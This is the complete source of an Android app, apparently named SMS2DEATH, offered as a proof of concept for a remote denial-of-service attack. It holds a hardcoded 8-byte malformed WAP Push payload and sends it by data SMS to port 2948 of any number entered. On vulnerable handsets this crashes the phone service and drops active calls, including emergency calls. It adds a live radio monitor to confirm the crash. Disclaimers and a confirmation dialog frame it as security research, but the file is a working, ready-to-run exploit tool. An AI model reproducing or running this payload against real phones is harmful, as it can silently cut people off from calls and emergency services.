package com.hacck3y.sms2death;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.graphics.Typeface;
import android.graphics.drawable.GradientDrawable;
import android.graphics.drawable.StateListDrawable;
import android.os.Bundle;
import android.telephony.PhoneStateListener;
import android.telephony.ServiceState;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.text.InputType;
import android.text.TextUtils;
import android.view.Gravity;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowInsets;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.LinearLayout;
import android.widget.ScrollView;
import android.widget.Spinner;
import android.widget.Switch;
import android.widget.TextView;
import android.widget.Toast;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * SMS2DEATH — reference proof-of-concept for the WAP Push remote DoS.
 *
 * Sends a crafted 8-byte WAP Push PDU as a data SMS to port 2948. On vulnerable
 * builds the receiver's WapPushOverSms.decodeWapPdu() casts a 5-byte uintvar to a
 * negative int and allocates it as an array size, throwing an uncaught
 * NegativeArraySizeException on the telephony main thread and killing
 * com.android.phone (which drops any active call, including emergency calls).
 *
 * See https://github.com/Hacck3y/SMS2DEATH for the writeup and disclaimer.
 * Authorised testing only.
 */
public class MainActivity extends Activity {

    /* ------------------------------------------------------------------ */
    /* Payload and palette                                                 */
    /* ------------------------------------------------------------------ */

    /** WSP/WAP-Push PDU: uintvar 0x80000000 -> int -2147483648 -> NegativeArraySizeException. */
    private static final byte[] CRASH_PDU = {
        0x01, 0x06, (byte) 0x88, (byte) 0x80, (byte) 0x80, (byte) 0x80, 0x00, (byte) 0xBE
    };
    private static final String PDU_HEX = "01 06 88 80 80 80 00 BE";
    private static final short WAP_PUSH_PORT = 2948;

    private static final int C_BG             = 0xFF0A0D12;
    private static final int C_SURFACE        = 0xFF141A24;
    private static final int C_SURFACE_RAISED = 0xFF1B2331;
    private static final int C_STROKE         = 0x26FFFFFF;
    private static final int C_TEXT           = 0xFFE9EEF7;
    private static final int C_MUTED          = 0xFF8A94A6;
    private static final int C_ACCENT         = 0xFF3B82F6;
    private static final int C_DANGER         = 0xFFE11D48;
    private static final int C_DANGER_PRESSED = 0xFFBE123C;
    private static final int C_GOOD           = 0xFF22C55E;
    private static final int C_WARN           = 0xFFF59E0B;
    private static final int C_CONSOLE_TEXT   = 0xFFC7D2E5;

    /* ------------------------------------------------------------------ */
    /* State                                                               */
    /* ------------------------------------------------------------------ */

    private EditText phoneInput;
    private Spinner senderSpinner;
    private TextView simInfo;
    private TextView console;
    private TextView consoleHint;
    private ScrollView consoleScroll;
    private Switch monitorSwitch;

    private List<SubscriptionInfo> subs;
    private final List<String> logLines = new ArrayList<>();
    private static final int MAX_LOG_LINES = 250;

    private TelephonyManager telephony;
    private PhoneStateListener radioListener;
    private int lastServiceState = Integer.MIN_VALUE;
    private int lastCallState = Integer.MIN_VALUE;

    /* ------------------------------------------------------------------ */
    /* Lifecycle                                                           */
    /* ------------------------------------------------------------------ */

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Edge-to-edge with a neutral strip behind the status bar: when
        // com.android.phone dies, the signal indicator is still legible through
        // it, which is how the crash is confirmed without logcat.
        getWindow().getDecorView().setBackgroundColor(0xFFB0B0B0);
        getWindow().setDecorFitsSystemWindows(false);

        FrameLayout outer = new FrameLayout(this);
        outer.setBackgroundColor(Color.TRANSPARENT);

        ScrollView scroll = new ScrollView(this);
        scroll.setBackgroundColor(C_BG);
        scroll.setFillViewport(true);
        scroll.setVerticalScrollBarEnabled(false);
        outer.addView(scroll, new FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT));

        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setBackgroundColor(C_BG);
        content.setPadding(dp(18), dp(22), dp(18), dp(28));
        scroll.addView(content, new ScrollView.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        buildHeader(content);
        buildTargetCard(content);
        buildSimCard(content);
        buildPayloadCard(content);
        buildMonitorCard(content);
        buildSendButton(content);
        buildConsoleCard(content);
        buildFooter(content);

        outer.setOnApplyWindowInsetsListener((v, insets) -> {
            android.graphics.Insets bars = insets.getInsets(WindowInsets.Type.systemBars());
            v.setPadding(0, bars.top, 0, 0);
            content.setPadding(dp(18), dp(22), dp(18), dp(28) + bars.bottom);
            return insets;
        });

        setContentView(outer);

        log("session started · android " + android.os.Build.VERSION.RELEASE
            + " (api " + android.os.Build.VERSION.SDK_INT + ")");

        requestPermissions(new String[] {
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_PHONE_STATE
        }, 1);

        populateSubsAndAutofill();
    }

    @Override
    protected void onDestroy() {
        stopRadioMonitor();
        super.onDestroy();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode != 1) return;
        for (int i = 0; i < permissions.length && i < grantResults.length; i++) {
            String name = permissions[i].substring(permissions[i].lastIndexOf('.') + 1);
            log("permission " + name + " -> "
                + (grantResults[i] == PackageManager.PERMISSION_GRANTED ? "granted" : "denied"));
        }
        populateSubsAndAutofill();
        if (monitorSwitch != null && monitorSwitch.isChecked()) startRadioMonitor();
    }

    /* ------------------------------------------------------------------ */
    /* Header                                                              */
    /* ------------------------------------------------------------------ */

    private void buildHeader(LinearLayout root) {
        TextView tag = new TextView(this);
        tag.setText("ANDROID TELEPHONY · ZERO-CLICK · REMOTE DoS");
        tag.setTextSize(10);
        tag.setTextColor(C_ACCENT);
        tag.setLetterSpacing(0.16f);
        tag.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        root.addView(tag);

        TextView title = new TextView(this);
        title.setText("SMS2DEATH");
        title.setTextSize(34);
        title.setTextColor(C_TEXT);
        title.setLetterSpacing(0.02f);
        title.setTypeface(Typeface.create("sans-serif-black", Typeface.BOLD));
        title.setPadding(0, dp(6), 0, 0);
        root.addView(title);

        TextView sub = new TextView(this);
        sub.setText("A single malformed WAP Push SMS kills com.android.phone on the "
            + "receiving handset, dropping any active call — silently, with no "
            + "interaction from the victim.");
        sub.setTextSize(12.5f);
        sub.setTextColor(C_MUTED);
        sub.setLineSpacing(dp(2), 1f);
        sub.setPadding(0, dp(8), 0, 0);
        root.addView(sub);

        LinearLayout chips = new LinearLayout(this);
        chips.setOrientation(LinearLayout.HORIZONTAL);
        chips.setPadding(0, dp(14), 0, 0);
        addChip(chips, "WAP Push");
        addChip(chips, "port " + WAP_PUSH_PORT);
        addChip(chips, "zero-click");
        addChip(chips, "silent");
        root.addView(chips);

        TextView warn = new TextView(this);
        warn.setText("⚠  Authorised testing only. This payload disconnects calls, "
            + "including emergency calls, on the target device.");
        warn.setTextSize(11.5f);
        warn.setTextColor(0xFFFFD9E0);
        warn.setLineSpacing(dp(2), 1f);
        warn.setPadding(dp(14), dp(12), dp(14), dp(12));
        warn.setBackground(rounded(0x1FE11D48, 14, 0x66E11D48, 1));
        LinearLayout.LayoutParams wp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        wp.topMargin = dp(16);
        root.addView(warn, wp);
    }

    private void addChip(LinearLayout row, String text) {
        TextView chip = new TextView(this);
        chip.setText(text);
        chip.setTextSize(10.5f);
        chip.setTextColor(C_TEXT);
        chip.setLetterSpacing(0.06f);
        chip.setGravity(Gravity.CENTER);
        chip.setPadding(dp(10), dp(5), dp(10), dp(5));
        chip.setBackground(rounded(C_SURFACE_RAISED, 999, C_STROKE, 1));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.rightMargin = dp(8);
        row.addView(chip, lp);
    }

    /* ------------------------------------------------------------------ */
    /* Cards                                                               */
    /* ------------------------------------------------------------------ */

    /** Section label, e.g. "01 · TARGET". */
    private void addSectionLabel(LinearLayout card, String number, String title) {
        TextView tv = new TextView(this);
        tv.setText(number + "  ·  " + title);
        tv.setTextSize(11);
        tv.setLetterSpacing(0.16f);
        tv.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        tv.setTextColor(C_ACCENT);
        card.addView(tv);
    }

    private LinearLayout newCard(LinearLayout root, int topMarginDp) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackground(rounded(C_SURFACE, 20, C_STROKE, 1));
        card.setPadding(dp(18), dp(16), dp(18), dp(18));
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = dp(topMarginDp);
        root.addView(card, lp);
        return card;
    }

    private void buildTargetCard(LinearLayout root) {
        LinearLayout card = newCard(root, 20);
        addSectionLabel(card, "01", "TARGET");

        TextView hint = new TextView(this);
        hint.setText("Number of the handset under test. It receives the crafted "
            + "data SMS on port 2948.");
        hint.setTextSize(11.5f);
        hint.setTextColor(C_MUTED);
        hint.setPadding(0, dp(6), 0, dp(12));
        hint.setLineSpacing(dp(2), 1f);
        card.addView(hint);

        phoneInput = new EditText(this);
        phoneInput.setHint("e.g. 0400000000");
        phoneInput.setInputType(InputType.TYPE_CLASS_PHONE);
        phoneInput.setSingleLine(true);
        phoneInput.setTextSize(20);
        phoneInput.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        phoneInput.setTextColor(C_TEXT);
        phoneInput.setHintTextColor(0x55FFFFFF);
        phoneInput.setBackground(rounded(C_SURFACE_RAISED, 14, C_STROKE, 1));
        phoneInput.setPadding(dp(16), dp(14), dp(16), dp(14));
        card.addView(phoneInput, new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setPadding(0, dp(12), 0, 0);
        Button auto = outlineButton("AUTO-FILL FROM SIM", C_ACCENT);
        auto.setOnClickListener(v -> {
            int pos = senderSpinner == null ? 0 : senderSpinner.getSelectedItemPosition();
            autofillDestForSender(pos);
        });
        Button clear = outlineButton("CLEAR", C_MUTED);
        clear.setOnClickListener(v -> phoneInput.setText(""));
        LinearLayout.LayoutParams blp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        blp.rightMargin = dp(10);
        row.addView(auto, blp);
        row.addView(clear);
        card.addView(row);
    }

    private void buildSimCard(LinearLayout root) {
        LinearLayout card = newCard(root, 14);
        addSectionLabel(card, "02", "SENDING SIM");

        TextView hint = new TextView(this);
        hint.setText("Subscription used to originate the data SMS.");
        hint.setTextSize(11.5f);
        hint.setTextColor(C_MUTED);
        hint.setPadding(0, dp(6), 0, dp(12));
        card.addView(hint);

        senderSpinner = new Spinner(this);
        senderSpinner.setPopupBackgroundDrawable(rounded(C_SURFACE_RAISED, 14, 0, 0));
        senderSpinner.setBackground(rounded(C_SURFACE_RAISED, 14, C_STROKE, 1));
        senderSpinner.setPadding(dp(10), dp(10), dp(10), dp(10));
        card.addView(senderSpinner, new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));

        simInfo = new TextView(this);
        simInfo.setTextSize(11.5f);
        simInfo.setTextColor(C_MUTED);
        simInfo.setPadding(0, dp(12), 0, 0);
        simInfo.setLineSpacing(dp(2), 1f);
        simInfo.setText("Grant phone permissions to enumerate SIMs.");
        card.addView(simInfo);
    }

    private void buildPayloadCard(LinearLayout root) {
        LinearLayout card = newCard(root, 14);
        addSectionLabel(card, "03", "PAYLOAD");

        TextView hex = new TextView(this);
        hex.setText(PDU_HEX);
        hex.setTextSize(18);
        hex.setTypeface(Typeface.MONOSPACE, Typeface.BOLD);
        hex.setTextColor(C_DANGER);
        hex.setGravity(Gravity.CENTER);
        hex.setPadding(dp(12), dp(14), dp(12), dp(14));
        hex.setBackground(rounded(C_SURFACE_RAISED, 14, 0x33E11D48, 1));
        LinearLayout.LayoutParams hl = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        hl.topMargin = dp(10);
        card.addView(hex, hl);

        TextView cap = new TextView(this);
        cap.setText("8-byte WAP Push PDU · data SMS · destination port " + WAP_PUSH_PORT
            + "\nuintvar 0x80000000 → (int) -2147483648 → NegativeArraySizeException");
        cap.setTextSize(11);
        cap.setTextColor(C_MUTED);
        cap.setTypeface(Typeface.MONOSPACE);
        cap.setLineSpacing(dp(3), 1f);
        cap.setPadding(0, dp(10), 0, 0);
        card.addView(cap);

        Button copy = outlineButton("COPY PDU", C_MUTED);
        copy.setOnClickListener(v -> {
            ClipboardManager cm = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null) cm.setPrimaryClip(ClipData.newPlainText("WAP Push PDU", PDU_HEX));
            toast("PDU copied");
        });
        LinearLayout.LayoutParams cl = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        cl.topMargin = dp(12);
        card.addView(copy, cl);
    }

    private void buildMonitorCard(LinearLayout root) {
        LinearLayout card = newCard(root, 14);
        addSectionLabel(card, "04", "LIVE RADIO MONITOR");

        LinearLayout row = new LinearLayout(this);
        row.setOrientation(LinearLayout.HORIZONTAL);
        row.setGravity(Gravity.CENTER_VERTICAL);
        row.setPadding(0, dp(10), 0, 0);

        monitorSwitch = new Switch(this);
        monitorSwitch.setText("Log service-state and call-state changes");
        monitorSwitch.setTextSize(12);
        monitorSwitch.setTextColor(C_TEXT);
        monitorSwitch.setChecked(true);
        monitorSwitch.setPadding(0, dp(8), 0, dp(8));
        monitorSwitch.setOnCheckedChangeListener((b, checked) -> {
            if (checked) startRadioMonitor();
            else stopRadioMonitor();
        });
        row.addView(monitorSwitch);
        card.addView(row);

        TextView hint = new TextView(this);
        hint.setText("A successful trigger shows the radio dropping to OUT_OF_SERVICE "
            + "for 1–2 s while com.android.phone restarts, then returning.");
        hint.setTextSize(11);
        hint.setTextColor(C_MUTED);
        hint.setLineSpacing(dp(2), 1f);
        hint.setPadding(0, dp(6), 0, 0);
        card.addView(hint);
    }

    private void buildSendButton(LinearLayout root) {
        Button send = new Button(this);
        send.setText("SEND CRASH SMS");
        send.setTextSize(16);
        send.setAllCaps(true);
        send.setLetterSpacing(0.1f);
        send.setTextColor(Color.WHITE);
        send.setTypeface(Typeface.create("sans-serif-medium", Typeface.BOLD));
        send.setBackground(pressable(C_DANGER, C_DANGER_PRESSED, 18));
        send.setPadding(dp(12), dp(20), dp(12), dp(20));
        send.setElevation(dp(2));
        send.setOnClickListener(v -> confirmAndSend());
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = dp(18);
        root.addView(send, lp);
    }

    private void buildConsoleCard(LinearLayout root) {
        LinearLayout card = newCard(root, 18);

        LinearLayout head = new LinearLayout(this);
        head.setOrientation(LinearLayout.HORIZONTAL);
        head.setGravity(Gravity.CENTER_VERTICAL);

        TextView label = new TextView(this);
        label.setText("RUN LOG");
        label.setTextSize(11);
        label.setLetterSpacing(0.16f);
        label.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        label.setTextColor(C_ACCENT);
        head.addView(label, new LinearLayout.LayoutParams(0,
            ViewGroup.LayoutParams.WRAP_CONTENT, 1f));

        Button clear = outlineButton("CLEAR", C_MUTED);
        clear.setOnClickListener(v -> {
            logLines.clear();
            console.setText("");
            consoleHint.setText("cleared");
        });
        head.addView(clear);
        card.addView(head);

        consoleHint = new TextView(this);
        consoleHint.setTextSize(11);
        consoleHint.setTextColor(C_MUTED);
        consoleHint.setPadding(0, dp(10), 0, dp(8));
        consoleHint.setText("adb logcat | grep -E 'NegativeArraySize|WapPushOverSms|com.android.phone'");
        card.addView(consoleHint);

        console = new TextView(this);
        console.setTextSize(10.5f);
        console.setTypeface(Typeface.MONOSPACE);
        console.setTextColor(C_CONSOLE_TEXT);
        console.setLineSpacing(dp(3), 1f);
        console.setPadding(dp(12), dp(12), dp(12), dp(12));
        console.setBackground(rounded(C_SURFACE_RAISED, 14, C_STROKE, 1));

        consoleScroll = new ScrollView(this);
        consoleScroll.setBackgroundColor(Color.TRANSPARENT);
        consoleScroll.setVerticalScrollBarEnabled(false);
        consoleScroll.addView(console, new ScrollView.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
        LinearLayout.LayoutParams cl = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, dp(230));
        card.addView(consoleScroll, cl);
    }

    private void buildFooter(LinearLayout root) {
        TextView footer = new TextView(this);
        footer.setText("SMS2DEATH is a security-research proof of concept for "
            + "authorised testing on devices you own or are explicitly permitted "
            + "to test. Using it against anyone else is a criminal offence, and "
            + "interfering with a person's access to emergency services is a "
            + "serious offence in Australia and most other countries.\n\n"
            + "Apache License 2.0 · no warranty · provided \"as is\".");
        footer.setTextSize(10.5f);
        footer.setTextColor(0x77FFFFFF);
        footer.setLineSpacing(dp(3), 1f);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
        lp.topMargin = dp(18);
        root.addView(footer, lp);
    }

    /* ------------------------------------------------------------------ */
    /* Subscriptions / auto-fill                                          */
    /* ------------------------------------------------------------------ */

    private void populateSubsAndAutofill() {
        try {
            SubscriptionManager sm = (SubscriptionManager)
                getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (sm == null) return;

            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE)
                    != PackageManager.PERMISSION_GRANTED) {
                simInfo.setText("READ_PHONE_STATE not granted — no SIM enumeration.");
                return;
            }

            subs = sm.getActiveSubscriptionInfoList();
            if (subs == null || subs.isEmpty()) {
                simInfo.setText("No active subscriptions found.");
                log("no active subscriptions");
                return;
            }

            List<String> items = new ArrayList<>();
            for (SubscriptionInfo s : subs) {
                items.add("SIM " + (s.getSimSlotIndex() + 1)
                    + " · " + s.getDisplayName()
                    + " · subId " + s.getSubscriptionId());
            }
            ArrayAdapter<String> adapter = new DarkSpinnerAdapter(this, items);
            senderSpinner.setAdapter(adapter);
            senderSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
                @Override
                public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                    autofillDestForSender(position);
                }
                @Override
                public void onNothingSelected(AdapterView<?> parent) {}
            });

            log("found " + subs.size() + " active subscription(s)");
            simInfo.setText(subs.size() + " subscription(s) available. Auto-fill uses the "
                + "other SIM's number when it can be resolved.");
            autofillDestForSender(senderSpinner.getSelectedItemPosition());
        } catch (SecurityException e) {
            simInfo.setText("SecurityException reading subscriptions: " + e.getMessage());
            log("SecurityException: " + e.getMessage());
        } catch (Exception e) {
            simInfo.setText("Auto-fill error: " + e.getMessage());
            log("auto-fill error: " + e);
        }
    }

    /**
     * Resolve a subscription MSISDN, trying every source available. Empty for many
     * eSIMs unless IMS-registered (numberFromIms). Order:
     *   1. SubscriptionManager.getPhoneNumber(subId)          — consolidated (API 33+)
     *   2. getPhoneNumber(subId, PHONE_NUMBER_SOURCE_IMS)     — eSIM-friendly
     *   3. getPhoneNumber(subId, PHONE_NUMBER_SOURCE_CARRIER)
     *   4. getPhoneNumber(subId, PHONE_NUMBER_SOURCE_UICC)
     *   5. SubscriptionInfo.getNumber()                       — legacy fallback
     */
    private String resolveNumber(SubscriptionInfo s) {
        if (s == null) return null;
        SubscriptionManager sm = (SubscriptionManager)
            getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        int subId = s.getSubscriptionId();
        try {
            String n = sm.getPhoneNumber(subId);
            if (n != null && !n.isEmpty()) return n;
        } catch (Exception ignored) {}
        int[] sources = {
            SubscriptionManager.PHONE_NUMBER_SOURCE_IMS,
            SubscriptionManager.PHONE_NUMBER_SOURCE_CARRIER,
            SubscriptionManager.PHONE_NUMBER_SOURCE_UICC
        };
        for (int src : sources) {
            try {
                String n = sm.getPhoneNumber(subId, src);
                if (n != null && !n.isEmpty()) return n;
            } catch (Exception ignored) {}
        }
        String n = s.getNumber();
        if (n != null && !n.isEmpty()) return n;
        return null;
    }

    /** Fill the target field with the MSISDN of a SIM other than the selected sender. */
    private void autofillDestForSender(int senderPos) {
        if (subs == null || subs.isEmpty()) return;
        if (senderPos < 0 || senderPos >= subs.size()) senderPos = 0;
        String autoNum = null;
        int chosenIdx = -1;
        for (int i = 0; i < subs.size(); i++) {
            if (i == senderPos) continue;
            String n = resolveNumber(subs.get(i));
            if (n != null && !n.isEmpty()) { autoNum = n; chosenIdx = i; break; }
        }
        if (autoNum == null) {
            String n = resolveNumber(subs.get(senderPos));
            if (n != null && !n.isEmpty()) { autoNum = n; chosenIdx = senderPos; }
        }
        if (autoNum != null) {
            phoneInput.setText(autoNum);
            log("auto-filled target from SIM slot "
                + (subs.get(chosenIdx).getSimSlotIndex() + 1) + ": " + autoNum);
        } else {
            log("no MSISDN exposed by any SIM — enter the target manually");
        }
    }

    /* ------------------------------------------------------------------ */
    /* Send                                                               */
    /* ------------------------------------------------------------------ */

    private void confirmAndSend() {
        final String dest = phoneInput.getText().toString().trim();
        if (dest.isEmpty()) {
            toast("Enter a target number first");
            log("send aborted: no target number");
            return;
        }
        if (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            toast("SEND_SMS not granted");
            log("send aborted: SEND_SMS not granted");
            return;
        }
        if (subs == null || subs.isEmpty()) {
            toast("No SIM info available");
            log("send aborted: no subscription info");
            return;
        }
        int pos = senderSpinner.getSelectedItemPosition();
        if (pos < 0 || pos >= subs.size()) pos = 0;
        final int subId = subs.get(pos).getSubscriptionId();
        final int slot = subs.get(pos).getSimSlotIndex();

        new AlertDialog.Builder(this, android.R.style.Theme_Material_Dialog_Alert)
            .setTitle("Confirm transmission")
            .setMessage("Send the malformed WAP Push to " + dest
                + " from SIM slot " + (slot + 1) + " (subId " + subId + ")?\n\n"
                + "This will drop any call in progress on that handset, including "
                + "emergency calls. Only proceed on devices you own or are "
                + "explicitly authorised to test.")
            .setNegativeButton("Cancel", (d, w) -> log("send cancelled"))
            .setPositiveButton("Send", (d, w) -> doSend(dest, subId, slot))
            .show();
    }

    private void doSend(String dest, int subId, int slot) {
        try {
            SmsManager mgr = getSystemService(SmsManager.class).createForSubscriptionId(subId);
            mgr.sendDataMessage(dest, null, WAP_PUSH_PORT, CRASH_PDU, null, null);

            log("TX → " + dest + " · PDU " + PDU_HEX + " · port " + WAP_PUSH_PORT
                + " · slot " + (slot + 1) + " (subId " + subId + ")");
            log("watch the target: FATAL EXCEPTION in com.android.phone within ~1-2 s, "
                + "then a new PID and a brief loss of service");
            toast("Sent to " + dest);
        } catch (SecurityException e) {
            log("send failed: SecurityException " + e.getMessage());
            toast("SecurityException on send");
        } catch (Exception e) {
            log("send failed: " + e);
            toast("Send error");
        }
    }

    /* ------------------------------------------------------------------ */
    /* Radio monitor                                                       */
    /* ------------------------------------------------------------------ */

    @SuppressWarnings("deprecation")
    private void startRadioMonitor() {
        if (radioListener != null) return;
        if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE)
                != PackageManager.PERMISSION_GRANTED) {
            log("radio monitor unavailable: READ_PHONE_STATE not granted");
            return;
        }
        try {
            telephony = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            if (telephony == null) {
                log("radio monitor unavailable: no telephony service");
                return;
            }
            radioListener = new PhoneStateListener() {
                @Override
                public void onServiceStateChanged(ServiceState s) {
                    int st = s == null ? -1 : s.getState();
                    if (st == lastServiceState) return;
                    lastServiceState = st;
                    log("radio · service state → " + serviceStateName(st));
                }
                @Override
                public void onCallStateChanged(int state, String number) {
                    if (state == lastCallState) return;
                    lastCallState = state;
                    log("radio · call state → " + callStateName(state));
                }
            };
            telephony.listen(radioListener,
                PhoneStateListener.LISTEN_SERVICE_STATE | PhoneStateListener.LISTEN_CALL_STATE);
            // Seed the current state so the first change is visible.
            radioListener.onServiceStateChanged(telephony.getServiceState());
            log("radio monitor armed");
        } catch (Throwable t) {
            radioListener = null;
            log("radio monitor failed: " + t);
        }
    }

    @SuppressWarnings("deprecation")
    private void stopRadioMonitor() {
        if (radioListener == null || telephony == null) return;
        try {
            telephony.listen(radioListener, PhoneStateListener.LISTEN_NONE);
            log("radio monitor stopped");
        } catch (Throwable ignored) {
        } finally {
            radioListener = null;
        }
    }

    private static String serviceStateName(int state) {
        switch (state) {
            case ServiceState.STATE_IN_SERVICE:      return "IN_SERVICE";
            case ServiceState.STATE_OUT_OF_SERVICE:  return "OUT_OF_SERVICE";
            case ServiceState.STATE_EMERGENCY_ONLY:  return "EMERGENCY_ONLY";
            case ServiceState.STATE_POWER_OFF:       return "POWER_OFF";
            default:                                 return "UNKNOWN(" + state + ")";
        }
    }

    private static String callStateName(int state) {
        switch (state) {
            case TelephonyManager.CALL_STATE_IDLE:     return "IDLE";
            case TelephonyManager.CALL_STATE_RINGING:  return "RINGING";
            case TelephonyManager.CALL_STATE_OFFHOOK:  return "OFFHOOK";
            default:                                   return "UNKNOWN(" + state + ")";
        }
    }

    /* ------------------------------------------------------------------ */
    /* Log + small view helpers                                            */
    /* ------------------------------------------------------------------ */

    private void log(String message) {
        String ts = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date());
        logLines.add("[" + ts + "] " + message);
        while (logLines.size() > MAX_LOG_LINES) logLines.remove(0);
        if (console != null) {
            console.setText(TextUtils.join("\n", logLines));
            if (consoleScroll != null) {
                final int bottom = console.getBottom();
                consoleScroll.post(() -> consoleScroll.scrollTo(0, bottom));
            }
        }
    }

    private void toast(String message) {
        Toast.makeText(this, message, Toast.LENGTH_SHORT).show();
    }

    private int dp(float value) {
        return Math.round(getResources().getDisplayMetrics().density * value);
    }

    private GradientDrawable rounded(int color, float radiusDp, int strokeColor, float strokeDp) {
        GradientDrawable g = new GradientDrawable();
        g.setShape(GradientDrawable.RECTANGLE);
        g.setColor(color);
        g.setCornerRadius(radiusDp >= 999 ? dp(999) : dp(radiusDp));
        if (strokeColor != 0) {
            g.setStroke(Math.max(1, dp(strokeDp)), strokeColor);
        }
        return g;
    }

    private StateListDrawable pressable(int normal, int pressed, float radiusDp) {
        StateListDrawable s = new StateListDrawable();
        s.addState(new int[] { android.R.attr.state_pressed }, rounded(pressed, radiusDp, 0, 0));
        s.addState(new int[] {}, rounded(normal, radiusDp, 0, 0));
        return s;
    }

    private Button outlineButton(String text, int textColor) {
        Button b = new Button(this);
        b.setText(text);
        b.setTextSize(11);
        b.setAllCaps(true);
        b.setLetterSpacing(0.08f);
        b.setTextColor(textColor);
        b.setTypeface(Typeface.create("sans-serif-medium", Typeface.NORMAL));
        StateListDrawable bg = new StateListDrawable();
        bg.addState(new int[] { android.R.attr.state_pressed },
            rounded(0x33FFFFFF, 12, C_STROKE, 1));
        bg.addState(new int[] {}, rounded(C_SURFACE_RAISED, 12, C_STROKE, 1));
        b.setBackground(bg);
        b.setPadding(dp(14), 0, dp(14), 0);
        b.setMinWidth(0);
        b.setMinimumWidth(0);
        b.setMinimumHeight(0);
        b.setHeight(dp(38));
        b.setStateListAnimator(null);
        return b;
    }

    /** Spinner adapter that renders dark rows instead of the platform default. */
    private static class DarkSpinnerAdapter extends ArrayAdapter<String> {
        DarkSpinnerAdapter(Context context, List<String> items) {
            super(context, android.R.layout.simple_spinner_item, items);
        }

        @Override
        public View getView(int position, View convertView, ViewGroup parent) {
            TextView tv = row(convertView, android.R.layout.simple_spinner_item, parent, false);
            tv.setText(getItem(position));
            return tv;
        }

        @Override
        public View getDropDownView(int position, View convertView, ViewGroup parent) {
            TextView tv = row(convertView, android.R.layout.simple_spinner_dropdown_item, parent, true);
            tv.setText(getItem(position));
            return tv;
        }

        private TextView row(View convertView, int layout, ViewGroup parent, boolean dropdown) {
            TextView tv;
            if (convertView instanceof TextView) {
                tv = (TextView) convertView;
            } else {
                tv = (TextView) android.view.LayoutInflater.from(getContext())
                    .inflate(layout, parent, false);
            }
            int pad = Math.round(14 * getContext().getResources().getDisplayMetrics().density);
            tv.setTextColor(C_TEXT);
            tv.setTextSize(13);
            tv.setPadding(pad, pad, pad, pad);
            if (dropdown) {
                tv.setBackgroundColor(C_SURFACE_RAISED);
            }
            return tv;
        }
    }
}
